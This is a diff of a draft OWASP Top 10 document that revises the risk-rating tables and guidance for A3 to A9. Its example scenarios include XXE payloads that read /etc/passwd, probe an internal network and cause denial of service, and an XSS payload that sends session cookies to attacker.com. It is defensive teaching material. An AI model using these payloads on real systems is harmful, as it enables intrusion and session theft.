+| Impact | MODERATE (2) | The impact of XSS is moderate for reflected and DOM XSS, and severe for stored XSS, with remote code execution on the victim's browser, such as stealing credentials, sessions, or delivering malware to the victim. |<br />
+| Business impacts | ? | The business impact is application specific, and depends on the classification and protection needs of your application and data. |<br />
+| Score | 6.0 | MEDIUM |<br />
+This issue is easily exploitable by manual means using freely available off the self tools and techniques. This issue is found in 40% of all assessments. The impact of exploitation is compromise of at least one targeted account, and often millions of accounts for undirected attacks.</p>
 <h2 id="am-i-vulnerable-to-attack-1">Am I vulnerable to attack?</h2>
 <p>Evidence of identity, authentication and session management are critical for separating malicious unauthenticated attackers with users who you might have a legal relationship.</p>
 <p>Common authentication vulnerabilities include:</p>
@@ -445,33 +554,54 @@
 <li><a href="https://cwe.mitre.org/data/definitions/384.html">CWE-384: Session Fixation</a></li>
 </ul>
 <h1 id="a3-sensitive-data-exposure">A3 Sensitive Data Exposure</h1>
-<!--- | Threat agents | Exploitability | Prevalance | Detectability | Technical Impact | Business Impacts |
-| --- | --- | --- | --- | --- | --- |
-| App Specific |  EASY | COMMON | AVERAGE | SEVERE | App Specific | 
-| TBA | TBA | TBA | TBA. | TBA | --->
-<table>
+<table style="width:12%;">
 <colgroup>
-<col style="width: 36%" />
-<col style="width: 35%" />
-<col style="width: 27%" />
+<col style="width: 4%" />
+<col style="width: 4%" />
+<col style="width: 4%" />
 </colgroup>
 <thead>
 <tr class="header">
-<th style="text-align: left;">Threat agents/Attack vectors</th>
-<th style="text-align: left;">Security Weakness</th>
-<th style="text-align: left;">Impacts</th>
+<th style="text-align: left;">Factor</th>
+<th style="text-align: left;">Score</th>
+<th style="text-align: left;">Description</th>
 </tr>
 </thead>
 <tbody>
 <tr class="odd">
-<td style="text-align: left;">Access Lvl \</td>
-<td style="text-align: left;">Exploitability</td>
-<td style="text-align: left;">Prevalance \</td>
+<td style="text-align: left;">Threat agent</td>
+<td style="text-align: left;">?</td>
+<td style="text-align: left;">The threat agent is app specific, and depends on access, motive, and goals against the data asset.</td>
 </tr>
 <tr class="even">
-<td style="text-align: left;">Even anonymous attackers typically don’t break crypto directly. They break something else, such as steal keys, do man-in-the-middle attacks, or steal clear text data off the server, while in transit, or from the user’s client, e.g. browser.</td>
-<td style="text-align: left;">The most common flaw is simply not encrypting sensitive data. When crypto is employed, weak key generation and management, and weak algorithm usage is common, particularly weak password hashing techniques. For data in transit server side weaknesses are mainly easy to detect, but hard for data in rest. Both with very varying exploitability. User agent (e.g. browser) weaknesses are easy to detect, but hard to exploit on a large scale.</td>
-<td style="text-align: left;">Failure frequently compromises all data that should have been protected. Typically, this information includes sensitive data such as health records, credentials, personal data, credit cards, etc. The business impact depends on the protection needs of your application and data.</td>
+<td style="text-align: left;">Exploitability</td>
+<td style="text-align: left;">AVERAGE (2)</td>
+<td style="text-align: left;">Manual attack is generally required. This is a core skill of penetration testers and motivated attackers.</td>
+</tr>
+<tr class="odd">
+<td style="text-align: left;">Prevalence</td>
+<td style="text-align: left;">WIDESPREAD (3)</td>
+<td style="text-align: left;">Over the last few years, this has been the most common impactful attack, with credit reporting agency breaches of over 150 million records of the most sensitive data possible, the Yahoo breach of over a billion accounts.</td>
+</tr>
+<tr class="even">
+<td style="text-align: left;">Detectability</td>
+<td style="text-align: left;">AVERAGE (2)</td>
+<td style="text-align: left;">Manual steps are required to characterize sensitive or legally controlled personally identifiable information, but automated tools can be used to find likely issues.</td>
+</tr>
+<tr class="odd">
+<td style="text-align: left;">Impact</td>
+<td style="text-align: left;">SEVERE (3)</td>
+<td style="text-align: left;">Failure frequently compromises all data that should have been protected. Typically, this information includes sensitive personal information (PII) data such as health records, credentials, personal data, credit cards, which often requires protection as defined by laws or regulations such as the EU GDPR or local privacy laws.</td>
+</tr>
+<tr class="even">
+<td style="text-align: left;">Business impacts</td>
+<td style="text-align: left;">?</td>
+<td style="text-align: left;">The business impact is application specific, and depends on the classification and protection needs of your application and data.</td>
+</tr>
+<tr class="odd">
+<td style="text-align: left;">Score</td>
+<td style="text-align: left;">7.0</td>
+<td style="text-align: left;">HIGH</td>
 </tr>
 </tbody>
 </table>
@@ -485,13 +615,13 @@
 <li>Is encryption not enforced, e.g. are any user agent (browser) security directives or headers missing?</li>
 <li>Does the user agent (e.g. app, mail client) not verify if the received certificate is valid.</li>
 </ul>
-<p>And more … For a more complete set of problems to avoid, see ASVS areas Crypto (V7), Data Prot (V9), and SSL/TLS (V10).</p>
+<p>And more … For a more complete set of problems to avoid, see ASVS areas Crypto (V7), Data Protection (V9), and SSL/TLS (V10).</p>
 <h2 id="how-do-i-prevent-2">How do I prevent</h2>
 <p>Do the following, at a minimum and consult the references:</p>
 <ul>
 <li>Make sure you encrypt all sensitive data at rest or transferred via clients, e.g. cookies, tokens.</li>
 <li>Encrypt all data in transit on application layer at least if any sensitive data may be transferred, e.g using TLS. Enforce this using directives like HTTP Strict Transport Security (HSTS).</li>
-<li>Don’t store sensitive data unnecessarily. Discard it as soon as possible. Data you don’t retain can’t be stolen.</li>
+<li>Don't store sensitive data unnecessarily. Discard it as soon as possible. Data you don't retain can't be stolen.</li>
 <li>Ensure up-to-date and strong standard algorithms or ciphers, parameters, protocols and keys are used, and proper key management is in place. Consider using FIPS 140 validated cryptographic modules.</li>
 <li>Ensure passwords are stored with a strong adaptive algorithm appropriate for password protection, such as Argon2i, scrypt, bcrypt and PBKDF2. Also be sure to set the work factor (delay factor) as high as you can tolerate.</li>
 <li>Disable autocomplete on forms requesting sensitive data and disable caching for pages that contain sensitive data.</li>
@@ -499,8 +629,8 @@
 </ul>
 <h2 id="example-scenarios-2">Example Scenarios</h2>
 <p>Scenario #1: An application encrypts credit card numbers in a database using automatic database encryption. However, this data is automatically decrypted when retrieved, allowing an SQL injection flaw to retrieve credit card numbers in clear text. Alternatives include not storing credit card numbers, using tokenization, or using public key encryption.</p>
-<p>Scenario #2: A site simply doesn’t use or enforce TLS for all pages, or if it supports weak encryption. An attacker simply monitors network traffic, strips or intercepts the TLS (like an open wireless network), and steals the user’s session cookie. The attacker then replays this cookie and hijacks the user’s (authenticated) session, accessing or modifying the user’s private data. Instead of the above he could also alter all transported data, e.g. the recipient of a money transfer.</p>
-<p>Scenario #3: The password database uses unsalted hashes to store everyone’s passwords. A file upload flaw allows an attacker to retrieve the password database. All of the unsalted hashes can be exposed with a rainbow table of precalculated hashes.</p>
+<p>Scenario #2: A site simply doesn't use or enforce TLS for all pages, or if it supports weak encryption. An attacker simply monitors network traffic, strips or intercepts the TLS (like an open wireless network), and steals the user's session cookie. The attacker then replays this cookie and hijacks the user's (authenticated) session, accessing or modifying the user's private data. Instead of the above he could also alter all transported data, e.g. the recipient of a money transfer.</p>
+<p>Scenario #3: The password database uses unsalted hashes to store everyone's passwords. A file upload flaw allows an attacker to retrieve the password database. All of the unsalted hashes can be exposed with a rainbow table of precalculated hashes.</p>
 <h2 id="references-2">References</h2>
 <h3 id="owasp-2">OWASP</h3>
 <ul>
@@ -517,83 +647,132 @@
 <li>CWE Entry 326 on Weak Encryption</li>
 </ul>
 <h1 id="a4-xml-external-entities-xxe">A4 XML External Entities (XXE)</h1>
-<table style="width:33%;">
+<table style="width:12%;">
 <colgroup>
-<col style="width: 5%" />
-<col style="width: 5%" />
-<col style="width: 5%" />
-<col style="width: 5%" />
-<col style="width: 5%" />
-<col style="width: 5%" />
+<col style="width: 4%" />
+<col style="width: 4%" />
+<col style="width: 4%" />
 </colgroup>
 <thead>
 <tr class="header">
-<th style="text-align: left;">Threat agents</th>
-<th style="text-align: left;">Exploitability</th>
-<th style="text-align: left;">Prevalance</th>
-<th style="text-align: left;">Detectability</th>
-<th style="text-align: left;">Technical Impact</th>
-<th style="text-align: left;">Business Impacts</th>
+<th style="text-align: left;">Factor</th>
+<th style="text-align: left;">Score</th>
+<th style="text-align: left;">Description</th>
 </tr>
 </thead>
 <tbody>
 <tr class="odd">
-<td style="text-align: left;">App Specific</td>
-<td style="text-align: left;">EASY</td>
-<td style="text-align: left;">COMMON</td>
-<td style="text-align: left;">AVERAGE</td>
-<td style="text-align: left;">SEVERE</td>
-<td style="text-align: left;">App Specific</td>
+<td style="text-align: left;">Threat agent</td>
+<td style="text-align: left;">?</td>
+<td style="text-align: left;">The threat agent is app specific, and depends on access, motive, and goals against the data asset.</td>
 </tr>
 <tr class="even">
-<td style="text-align: left;">TBA</td>
-<td style="text-align: left;">TBA</td>
-<td style="text-align: left;">TBA</td>
-<td style="text-align: left;">TBA.</td>
-<td style="text-align: left;">TBA</td>
+<td style="text-align: left;">Exploitability</td>
+<td style="text-align: left;">AVERAGE (2)</td>
+<td style="text-align: left;">Penetration testers should be capable of exploiting XXE once trained. DAST tools require additional manual steps to exploit this issue.</td>
+</tr>
+<tr class="odd">
+<td style="text-align: left;">Prevalence</td>
+<td style="text-align: left;">COMMON (2)</td>
+<td style="text-align: left;">XXE was found in a significant number of apps and web services.</td>
+</tr>
+<tr class="even">
+<td style="text-align: left;">Detectability</td>
+<td style="text-align: left;">EASY (3)</td>
+<td style="text-align: left;">Automated detection of XXE is possible by DAST tools by inspecting for XML documents or data used, or by setting up a web server or tool to receive connections from the victim XML processor. SAST tools can discover this issue by inspecting dependencies and configuration.</td>
+</tr>
+<tr class="odd">
+<td style="text-align: left;">Impact</td>
+<td style="text-align: left;">SEVERE (3)</td>
+<td style="text-align: left;">XXE can be used for internal port scanning, internal remote and local file inclusion, and for denial of service.</td>
+</tr>
+<tr class="even">
+<td style="text-align: left;">Business impacts</td>
+<td style="text-align: left;">?</td>
+<td style="text-align: left;">The business impact is application specific, and depends on the classification and protection needs of your application and data.</td>
+</tr>
+<tr class="odd">
+<td style="text-align: left;">Score</td>
+<td style="text-align: left;">7.0</td>
+<td style="text-align: left;">HIGH</td>
 </tr>
 </tbody>
 </table>
 <h2 id="am-i-vulnerable-to-attack-3">Am I vulnerable to attack?</h2>
-<p>TBA</p>
+<p>You may be vulnerable to XXE if your application processes XML input without explicitly disabling <a href="https://en.wikipedia.org/wiki/Document_type_definition">document type definitions (DTDs)</a>.</p>
 <h2 id="how-do-i-prevent-3">How do I prevent</h2>
-<p>TBA</p>
+<p>Preventing XXE requires disabling XML DTD processing in all XML parsers in your application.</p>
 <h2 id="example-scenarios-3">Example Scenarios</h2>
-<p>TBA</p>
+<p>Scenario #1: The attacker attempts to extract data from the server:</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;
+ &lt;!DOCTYPE foo [
+  &lt;!ELEMENT foo ANY &gt;
+  &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;
+ &lt;foo&gt;&amp;xxe;&lt;/foo&gt;</code></pre>
+<p>Scenario #2: An attacker probes the server's private network by changing the above <code>ENTITY</code> line to:</p>
+<pre><code>  &lt;!ENTITY xxe SYSTEM &quot;https://192.168.1.1/private/service&quot; &gt;]&gt;</code></pre>
+<p>Scenario #3: An attacker attempts a denial-of-service attack by including a potentially endless file:</p>
+<pre><code>  &lt;!ENTITY xxe SYSTEM &quot;file:///dev/random&quot; &gt;]&gt;</code></pre>
 <h2 id="references-3">References</h2>
 <h3 id="owasp-3">OWASP</h3>
 <ul>
 <li><a href="">OWASP Proactive Controls - TBA</a></li>
 <li><a href="">OWASP Application Security Verification Standard - TBA</a></li>
 <li><a href="">OWASP Testing Guide - TBA</a></li>
-<li><a href="">OWASP Cheat Sheet - TBA</a></li>
+<li><a href="https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing">OWASP XXE Vulnerability</a></li>
+<li><a href="https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Prevention_Cheat_Sheet">OWASP XXE Prevention Cheat Sheet</a></li>
 </ul>
 <h3 id="external-3">External</h3>
 <p>TBA</p>
 <h1 id="a5-security-misconfiguration">A5 Security Misconfiguration</h1>
-<table>
+<table style="width:12%;">
 <colgroup>
-<col style="width: 36%" />
-<col style="width: 35%" />
-<col style="width: 27%" />
+<col style="width: 4%" />
+<col style="width: 4%" />
+<col style="width: 4%" />
 </colgroup>
 <thead>
 <tr class="header">
-<th style="text-align: left;">Threat agents/Attack vectors</th>
-<th style="text-align: left;">Security Weakness</th>
-<th style="text-align: left;">Impacts</th>
+<th style="text-align: left;">Factor</th>
+<th style="text-align: left;">Score</th>
+<th style="text-align: left;">Description</th>
 </tr>
 </thead>
 <tbody>
 <tr class="odd">
-<td style="text-align: left;">Access Lvl \</td>
-<td style="text-align: left;">Exploitability</td>
-<td style="text-align: left;">Prevalance \</td>
+<td style="text-align: left;">Threat agent</td>
+<td style="text-align: left;">?</td>
+<td style="text-align: left;">Anonymous attackers can access default accounts, unused pages, unpatched flaws, unprotected files and directories, etc. to gain unauthorized access to or knowledge of the system.</td>
 </tr>
 <tr class="even">
-<td style="text-align: left;">Even Anonymous attackers access default accounts, unused pages, unpatched flaws, unprotected files and directories, etc. to gain unauthorized access to or knowledge of the system.</td>
-<td style="text-align: left;">Security misconfiguration can happen at any level of an application stack, including the platform, web server, application server, database, frameworks, and custom code. Automated scanners are useful for detecting misconfigurations, use of default accounts or configs, unnecessary services, legacy options etc.</td>
-<td style="text-align: left;">Such flaws frequently give attackers unauthorized access to some system data or functionality. Occasionally, such flaws result in a complete system compromise. The business impact depends on the protection needs of your application and data.</td>
+<td style="text-align: left;">Exploitability</td>
+<td style="text-align: left;">EASY (3)</td>
+<td style="text-align: left;">Security misconfiguration can happen at any level of an application stack, including the platform, web server, application server, database, frameworks, and custom code.</td>
+</tr>
+<tr class="odd">
+<td style="text-align: left;">Prevalence</td>
+<td style="text-align: left;">PERVASIVE (4)</td>
+<td style="text-align: left;">Misconfiguration is the top issue in our data.</td>
+</tr>
+<tr class="even">
+<td style="text-align: left;">Detectability</td>
+<td style="text-align: left;">EASY (3)</td>
+<td style="text-align: left;">Automated scanners are useful for detecting misconfigurations, use of default accounts or configs, unnecessary services, or legacy systems.</td>
+</tr>
+<tr class="odd">
+<td style="text-align: left;">Impact</td>
+<td style="text-align: left;">MODERATE (2)</td>
+<td style="text-align: left;">Such flaws frequently give attackers unauthorized access to some system data or functionality. Occasionally, such flaws result in a complete system compromise.</td>
+</tr>
+<tr class="even">
+<td style="text-align: left;">Business impacts</td>
+<td style="text-align: left;">?</td>
+<td style="text-align: left;">The business impact is application specific, and depends on the classification and protection needs of your application and data.</td>
+</tr>
+<tr class="odd">
+<td style="text-align: left;">Score</td>
+<td style="text-align: left;">6.0</td>
+<td style="text-align: left;">MEDIUM</td>
 </tr>
 </tbody>
 </table>
@@ -619,7 +798,7 @@ Do you adhere on obsolete backward compatibility?</p></li>
 <li><p>An automated process to verify independently the efficiency of the configs and settings in all environments.</p></li>
 </ol>
 <h2 id="example-scenarios-4">Example Scenarios</h2>
-<p>Scenario #1: The app server admin console is automatically installed and not removed. Default accounts aren’t changed. Attacker discovers the standard admin pages are on your server, logs in with default passwords, and takes over.</p>
+<p>Scenario #1: The app server admin console is automatically installed and not removed. Default accounts aren't changed. Attacker discovers the standard admin pages are on your server, logs in with default passwords, and takes over.</p>
 <p>Scenario #2: Directory listing is not disabled on your web server. An attacker discovers they can simply list directories to find any file. The attacker finds and downloads all your compiled Java classes, which they decompile and reverse engineer to get all your custom code. Attacker then finds a serious access control flaw in your application.</p>
 <p>Scenario #3: App server configuration allows stack traces to be returned to users, potentially exposing underlying flaws such as framework versions that are known to be vulnerable.</p>
 <p>Scenario #4: App server comes with sample applications that are not removed from your production server. These sample applications have well known security flaws attackers can use to compromise your server.</p>
@@ -640,37 +819,57 @@ Do you adhere on obsolete backward compatibility?</p></li>
 <li>CIS Security Configuration Guides/Benchmarks</li>
 </ul>
 <h1 id="a6-access-control">A6 Access Control</h1>
-<table style="width:33%;">
+<table style="width:12%;">
 <colgroup>
-<col style="width: 5%" />
-<col style="width: 5%" />
-<col style="width: 5%" />
-<col style="width: 5%" />
-<col style="width: 5%" />
-<col style="width: 5%" />
+<col style="width: 4%" />
+<col style="width: 4%" />
+<col style="width: 4%" />
 </colgroup>
 <thead>
 <tr class="header">
-<th style="text-align: left;">Threat agents</th>
-<th style="text-align: left;">Exploitability</th>
-<th style="text-align: left;">Prevalance</th>
-<th style="text-align: left;">Detectability</th>
-<th style="text-align: left;">Technical Impact</th>
-<th style="text-align: left;">Business Impacts</th>
+<th style="text-align: left;">Factor</th>
+<th style="text-align: left;">Score</th>
+<th style="text-align: left;">Description</th>
 </tr>
 </thead>
 <tbody>
 <tr class="odd">
-<td style="text-align: left;">App Specific</td>
-<td style="text-align: left;">2</td>
-<td style="text-align: left;">2</td>
-<td style="text-align: left;">2</td>
-<td style="text-align: left;">3</td>
-<td style="text-align: left;">App Specific</td>
+<td style="text-align: left;">Threat agent</td>
+<td style="text-align: left;">?</td>
+<td style="text-align: left;">The threat agent is app specific, and depends on access, motive, and goals against the data asset.</td>
+</tr>
+<tr class="even">
+<td style="text-align: left;">Exploitability</td>
+<td style="text-align: left;">MODERATE (2)</td>
+<td style="text-align: left;">Exploitation of access control is a core skill of penetration testers. SAST and DAST tools can detect the abscense of access control, but not verify if it is functional.</td>
+</tr>
+<tr class="odd">
+<td style="text-align: left;">Prevalence</td>
+<td style="text-align: left;">COMMON (2)</td>
+<td style="text-align: left;">Access control weaknesses are common due to the lack of automated detection, and lack of effective functional testing by application developers.</td>
+</tr>
+<tr class="even">
+<td style="text-align: left;">Detectability</td>
+<td style="text-align: left;">AVERAGE (2)</td>
+<td style="text-align: left;">Access control is detectable using manual means, or possibly through automation for the abscence of access controls in certain frameworks.</td>
+</tr>
+<tr class="odd">
+<td style="text-align: left;">Impact</td>
+<td style="text-align: left;">SEVERE (3)</td>
+<td style="text-align: left;">The technical impact is anonymous attackers acting as users or administrators, users using privileged functions, or creating, accessing, updating or deleting every record.</td>
+</tr>
+<tr class="even">
+<td style="text-align: left;">Business impacts</td>
+<td style="text-align: left;">?</td>
+<td style="text-align: left;">The business impact is application specific, and depends on the classification and protection needs of your application and data.</td>
+</tr>
+<tr class="odd">
+<td style="text-align: left;">Score</td>
+<td style="text-align: left;">6.0</td>
+<td style="text-align: left;">MEDIUM</td>
 </tr>
 </tbody>
 </table>
-<p>Access control is discovered and exploited by manual means, and is not amenable to automated exploitation or discovery. This issue is found in 25% of all assessments. The impact of exploitation is anonymous attackers acting as users or administrators, users using privileged functions, or creating, accessing, updating or deleting every record.</p>
 <h2 id="am-i-vulnerable-to-attack-5">Am I vulnerable to attack?</h2>
 <p>Access control is the process of ensuring that users cannot act outside of their role or granted permissions, such that they can only access secured information and functionality that they are explicitly granted access. Commonly, applications fail to enforce access control in a wide variety of ways, but typically this can lead to critical unauthorized information disclosure, modification or destruction of all data within a system, or performing a business function well outside of the limits of the user.</p>
 <p>Common access control vulnerabilities include:</p>
@@ -720,7 +919,7 @@ ResultSet results = pstmt.executeQuery( );<br />
 <li><code>http://example.com/app/getappInfo</code></li>
 <li><code>http://example.com/app/admin_getappInfo</code></li>
 </ul>
-<p>If an unauthenticated user can access either page, it’s a flaw. If a non-admin can access the admin page, this is also a flaw.</p>
+<p>If an unauthenticated user can access either page, it's a flaw. If a non-admin can access the admin page, this is also a flaw.</p>
 <h2 id="references-5">References</h2>
 <h3 id="owasp-5">OWASP</h3>
 <ul>
@@ -737,45 +936,59 @@ ResultSet results = pstmt.executeQuery( );<br />
 <li><a href="https://cwe.mitre.org/data/definitions/639.html">CWE-639: Authorization Bypass Through User-Controlled Key</a></li>
 </ul>
 <h1 id="a7-cross-site-scripting">A7 Cross Site Scripting</h1>
-<table style="width:33%;">
+<table style="width:12%;">
 <colgroup>
-<col style="width: 5%" />
-<col style="width: 5%" />
-<col style="width: 5%" />
-<col style="width: 5%" />
-<col style="width: 5%" />
-<col style="width: 5%" />
+<col style="width: 4%" />
+<col style="width: 4%" />
+<col style="width: 4%" />
 </colgroup>
 <thead>
 <tr class="header">
-<th style="text-align: left;">Threat agents</th>
-<th style="text-align: left;">Exploitability</th>
-<th style="text-align: left;">Prevalance</th>
-<th style="text-align: left;">Detectability</th>
-<th style="text-align: left;">Technical Impact</th>
-<th style="text-align: left;">Business Impacts</th>
+<th style="text-align: left;">Factor</th>
+<th style="text-align: left;">Score</th>
+<th style="text-align: left;">Description</th>
 </tr>
 </thead>
 <tbody>
 <tr class="odd">
-<td style="text-align: left;">App Specific</td>
-<td style="text-align: left;">EASY</td>
-<td style="text-align: left;">COMMON</td>
-<td style="text-align: left;">AVERAGE</td>
-<td style="text-align: left;">SEVERE</td>
-<td style="text-align: left;">App Specific</td>
+<td style="text-align: left;">Threat agent</td>
+<td style="text-align: left;">?</td>
+<td style="text-align: left;">The threat agent is app specific, and depends on access, motive, and goals against the data asset.</td>
 </tr>
 <tr class="even">
-<td style="text-align: left;">TBA</td>
-<td style="text-align: left;">TBA</td>
-<td style="text-align: left;">TBA</td>
-<td style="text-align: left;">TBA.</td>
-<td style="text-align: left;">TBA</td>
+<td style="text-align: left;">Exploitability</td>
+<td style="text-align: left;">EASY (3)</td>
+<td style="text-align: left;">Automated tools can exploit all three forms of XSS, and there are freely available exploitation frameworks.</td>
+</tr>
+<tr class="odd">
+<td style="text-align: left;">Prevalence</td>
+<td style="text-align: left;">WIDESPREAD (3)</td>
+<td style="text-align: left;">XSS is the second most prevalent issue in the OWASP Top 10, and is found in around two thirds of all applications.</td>
+</tr>
+<tr class="even">
+<td style="text-align: left;">Detectability</td>
+<td style="text-align: left;">EASY (3)</td>
+<td style="text-align: left;">XSS can be discovered by SAST and DAST tools, as well as anyone with a browser.</td>
+</tr>
+<tr class="odd">
+<td style="text-align: left;">Impact</td>
+<td style="text-align: left;">MODERATE (2)</td>
+<td style="text-align: left;">The impact of XSS is moderate for reflected and DOM XSS, and severe for stored XSS, with remote code execution on the victim's browser, such as stealing credentials, sessions, or delivering malware to the victim.</td>
+</tr>
+<tr class="even">
+<td style="text-align: left;">Business impacts</td>
+<td style="text-align: left;">?</td>
+<td style="text-align: left;">The business impact is application specific, and depends on the classification and protection needs of your application and data.</td>
+</tr>
+<tr class="odd">
+<td style="text-align: left;">Score</td>
+<td style="text-align: left;">6.0</td>
+<td style="text-align: left;">MEDIUM</td>
 </tr>
 </tbody>
 </table>
 <h2 id="am-i-vulnerable-to-attack-6">Am I vulnerable to attack?</h2>
-<p>You are vulnerable to Server XSS if your server-side code uses user-supplied input as part of the HTML output, and you don’t use context-sensitive escaping to ensure it cannot run. If a web page uses JavaScript to dynamically add attacker-controllable data to a page, you may have Client XSS. Ideally, you would avoid sending attacker-controllable data to unsafe JavaScript APIs, but escaping (and to a lesser extent) input validation can be used to make this safe.</p>
+<p>You are vulnerable to Server XSS if your server-side code uses user-supplied input as part of the HTML output, and you don't use context-sensitive escaping to ensure it cannot run. If a web page uses JavaScript to dynamically add attacker-controllable data to a page, you may have Client XSS. Ideally, you would avoid sending attacker-controllable data to unsafe JavaScript APIs, but escaping (and to a lesser extent) input validation can be used to make this safe.</p>
 <p>Automated tools can find some XSS problems automatically.<br />
 However, each application builds output pages differently and uses different browser side interpreters such as JavaScript, ActiveX, Flash, and Silverlight, usually using 3rd party libraries built on top of these technologies.<br />
 This diveristy makes automated detection difficult, particularly when using modern single-page applications and powerful JavaScript frameworks and libraries.<br />
@@ -790,9 +1003,9 @@ Therefore, complete coverage requires a combination of manual code review and pe
 <h2 id="example-scenarios-6">Example Scenarios</h2>
 <p>The application uses untrusted data in the construction of the following HTML snippet without validation or escaping:</p>
 <p><code>(String) page += &quot;&lt;input name='creditcard' type='TEXT' value='&quot; + request.getParameter(&quot;CC&quot;) + &quot;'&gt;&quot;;</code></p>
-<p>The attacker manipulates the ‘CC’ parameter in his browser to:</p>
+<p>The attacker manipulates the 'CC' parameter in his browser to:</p>
 <p><code>'&gt;&lt;script&gt;document.location='http://www.attacker.com/cgi-bin/cookie.cgi?foo='+document.cookie&lt;/script&gt;'</code></p>
-<p>This attack causes the victim’s session ID to be sent to the attacker’s website, allowing the attacker to hijack the user’s current session.<br />
+<p>This attack causes the victim's session ID to be sent to the attacker's website, allowing the attacker to hijack the user's current session.<br />
 Note that attackers can also use XSS to defeat any automated CSRF defense the application might employ. See 2017-A8 for information on CSRF.</p>
 <h2 id="references-6">References</h2>
 <h3 id="owasp-6">OWASP</h3>
@@ -809,37 +1022,57 @@ Note that attackers can also use XSS to defeat any automated CSRF defense the ap
 <li><p>Do we have a non-vendor reference for this? <a href="https://portswigger.net/knowledgebase/issues/details/00200308_clientsidetemplateinjection">PortSwigger: Client-side template injection</a></p></li>
 </ul>
 <h1 id="a8-deserialization">A8 Deserialization</h1>
-<table style="width:33%;">
+<table style="width:12%;">
 <colgroup>
-<col style="width: 5%" />
-<col style="width: 5%" />
-<col style="width: 5%" />
-<col style="width: 5%" />
-<col style="width: 5%" />
-<col style="width: 5%" />
+<col style="width: 4%" />
+<col style="width: 4%" />
+<col style="width: 4%" />
 </colgroup>
 <thead>
 <tr class="header">
-<th style="text-align: left;">Threat agents</th>
-<th style="text-align: left;">Exploitability</th>
-<th style="text-align: left;">Prevalance</th>
-<th style="text-align: left;">Detectability</th>
-<th style="text-align: left;">Technical Impact</th>
-<th style="text-align: left;">Business Impacts</th>
+<th style="text-align: left;">Factor</th>
+<th style="text-align: left;">Score</th>
+<th style="text-align: left;">Description</th>
 </tr>
 </thead>
 <tbody>
 <tr class="odd">
-<td style="text-align: left;">App Specific</td>
-<td style="text-align: left;">2</td>
-<td style="text-align: left;">2</td>
-<td style="text-align: left;">3</td>
-<td style="text-align: left;">3</td>
-<td style="text-align: left;">App Specific</td>
+<td style="text-align: left;">Threat agent</td>
+<td style="text-align: left;">?</td>
+<td style="text-align: left;">The threat agent is app specific, and depends on access, motive, and goals against the data asset.</td>
+</tr>
+<tr class="even">
+<td style="text-align: left;">Exploitability</td>
+<td style="text-align: left;">DIFFICULT (1)</td>
+<td style="text-align: left;">Exploitation of deserialization is somewhat difficult, as although there are off the shelf exploits, these rarely work without changes or tweaks to the underlying exploit code.</td>
+</tr>
+<tr class="odd">
+<td style="text-align: left;">Prevalence</td>
+<td style="text-align: left;">COMMON (2)</td>
+<td style="text-align: left;">There is little data on the prevalence of this issue, and so this issue has been selected by the community.</td>
+</tr>
+<tr class="even">
+<td style="text-align: left;">Detectability</td>
+<td style="text-align: left;">AVERAGE (2)</td>
+<td style="text-align: left;">This issue can be discovered by tools, but is not easily verifiable due to backported patches or hidden headers. The best place to detect this issue is using dependency checkers in the CI/CD platform.</td>
+</tr>
+<tr class="odd">
+<td style="text-align: left;">Impact</td>
+<td style="text-align: left;">SEVERE (3)</td>
+<td style="text-align: left;">The impact of this issue is severe, with remote code execution on the server where the object is de-serialized.</td>
+</tr>
+<tr class="even">
+<td style="text-align: left;">Business impacts</td>
+<td style="text-align: left;">?</td>
+<td style="text-align: left;">The business impact is application specific, and depends on the classification and protection needs of your application and data.</td>
+</tr>
+<tr class="odd">
+<td style="text-align: left;">Score</td>
+<td style="text-align: left;">5.0</td>
+<td style="text-align: left;">MEDIUM</td>
 </tr>
 </tbody>
 </table>
-<p>Exploitation of deserialization is somewhat difficult, as although there are off the shelf exploits, these rarely work without changes or tweaks to the underlying exploit code. There is little data on the prevalence of this issue, and so this issue has been selected by the community. The impact of this issue is severe, with remote code execution on the server where the object is de-serialized.</p>
 <h2 id="am-i-vulnerable-to-attack-7">Am I vulnerable to attack?</h2>
 <p>Application architecture has changed dramatically over the last few years, with the move to &quot;server-less&quot; API driven mobile and single page applications, with the associated rise of functional programming frameworks and languages. This seismic shift in application architecture were accompanied by the idea of the client maintaining state, to allow theoretical simpler and more scalable functional code. However, the hallmark of application security is the location of trusted state. Security state cannot be sent to the client without some form of integrity promise.</p>
 <p>Applications and APIs will be vulnerable if the code:</p>
@@ -878,40 +1111,54 @@ Note that attackers can also use XSS to defeat any automated CSRF defense the ap
 <li><a href="https://cwe.mitre.org/data/definitions/502.html">CWE-502: Deserialization of Untrusted Data</a></li>
 </ul>
 <h1 id="a9-using-compenents-with-known-vulnerabilities">A9 Using Compenents with Known Vulnerabilities</h1>
-<table style="width:33%;">
+<table style="width:12%;">
 <colgroup>
-<col style="width: 5%" />
-<col style="width: 5%" />
-<col style="width: 5%" />
-<col style="width: 5%" />
-<col style="width: 5%" />
-<col style="width: 5%" />
+<col style="width: 4%" />
+<col style="width: 4%" />
+<col style="width: 4%" />
 </colgroup>
 <thead>
 <tr class="header">
-<th style="text-align: left;">Threat agents</th>
-<th style="text-align: left;">Exploitability</th>
-<th style="text-align: left;">Prevalance</th>
-<th style="text-align: left;">Detectability</th>
-<th style="text-align: left;">Technical Impact</th>
-<th style="text-align: left;">Business Impacts</th>
+<th style="text-align: left;">Factor</th>
+<th style="text-align: left;">Score</th>
+<th style="text-align: left;">Description</th>
 </tr>
 </thead>
 <tbody>
 <tr class="odd">
-<td style="text-align: left;">App Specific</td>
-<td style="text-align: left;">EASY</td>
-<td style="text-align: left;">COMMON</td>
-<td style="text-align: left;">AVERAGE</td>
-<td style="text-align: left;">SEVERE</td>
-<td style="text-align: left;">App Specific</td>
+<td style="text-align: left;">Threat agent</td>
+<td style="text-align: left;">?</td>
+<td style="text-align: left;">The threat agent is app specific, and depends on access, motive, and goals against the data asset.</td>
 </tr>
 <tr class="even">
-<td style="text-align: left;">TBA</td>
-<td style="text-align: left;">TBA</td>
-<td style="text-align: left;">TBA</td>
-<td style="text-align: left;">TBA.</td>
-<td style="text-align: left;">TBA</td>
+<td style="text-align: left;">Exploitability</td>
+<td style="text-align: left;">AVERAGE (2)</td>
+<td style="text-align: left;">There are off the shelf exploits for certain platforms, but typically this issue requires authentication or access to specific platform functionality.</td>
+</tr>
+<tr class="odd">
+<td style="text-align: left;">Prevalence</td>
